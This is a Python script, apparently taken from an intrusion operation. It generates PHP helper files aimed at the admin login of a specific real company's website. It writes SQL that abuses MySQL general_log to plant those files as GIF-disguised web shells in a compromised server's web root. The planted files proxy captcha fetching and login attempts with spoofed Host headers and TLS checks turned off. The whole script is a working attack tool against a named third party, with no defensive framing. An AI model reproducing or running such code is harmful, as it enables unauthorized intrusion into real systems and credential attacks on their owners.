#!/usr/bin/env python3
"""gen_sunten_tools.py - 生成sunten(113.96.190.199)专用工具
getcap_st.php: 下载验证码(带Host头)
login_st.php: 提交登录(带Host头)
"""
getcap = '<?php $ch=curl_init("https://113.96.190.199/admin.php/Auth/verify");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HTTPHEADER,array("Host: en.sunten.com.cn","Referer: https://en.sunten.com.cn/admin.php/Auth/index.html"));curl_setopt($ch,CURLOPT_COOKIEJAR,"C:/phpStudy/WWW/st_c.txt");curl_setopt($ch,CURLOPT_COOKIEFILE,"C:/phpStudy/WWW/st_c.txt");curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/st_cap.jpg",$r);echo "SAVED:".strlen($r);?>'

login = '<?php $u=$_GET["u"];$p=$_GET["p"];$c=$_GET["c"];$jar="C:/phpStudy/WWW/st_c.txt";$ch=curl_init("https://113.96.190.199/admin.php/Auth/login");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HTTPHEADER,array("Host: en.sunten.com.cn","Referer: https://en.sunten.com.cn/admin.php/Auth/index.html","X-Requested-With: XMLHttpRequest"));curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"username=".$u."&password=".$p."&secode=".$c);curl_setopt($ch,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);echo $r;?>'

for name, body in [('getcap_st.php', getcap), ('login_st.php', login)]:
    assert "'" not in body, name
    sql = []
    sql.append("SET GLOBAL general_log=OFF;")
    sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log=ON;")
    sql.append("SELECT 'GIF89a%s//'" % body)
    sql.append("SET GLOBAL general_log=OFF;")
    with open('/tmp/st_%s.sql' % name.replace('.php', ''), 'w') as f:
        f.write('\n'.join(sql) + '\n')
    print(name, 'ready len', len(body))
